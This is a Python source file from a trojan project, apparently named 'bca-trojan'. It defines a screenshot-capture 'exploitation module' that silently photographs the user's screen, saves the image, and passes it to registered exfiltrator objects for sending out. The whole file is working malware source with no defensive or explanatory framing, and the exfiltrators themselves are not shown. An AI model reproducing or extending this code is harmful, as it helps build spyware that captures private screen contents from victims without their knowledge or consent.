#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = 'EONRaider @ keybase.io/eonraider'

from pathlib import Path

from mss import mss

from src.modules.exploitation.base import ExploitationModule


class ScreenShot(ExploitationModule):
    def __init__(self, file_path: [str, Path]):
        super().__init__()
        self._file_path = Path(file_path)

    @property
    def contents(self) -> Path:
        return self._file_path

    @property
    def has_data(self) -> bool:
        return self._file_path.is_file()

    def report(self):
        raise NotImplementedError()

    def _notify_all_exfiltrators(self) -> None:
        [exfiltrator.update(self.contents) for exfiltrator in
         self._exfiltrators]

    def execute(self):
        """Take a screenshot and save the file."""
        with mss() as screen:
            screen.shot(output=str(self._file_path))
        self._notify_all_exfiltrators()
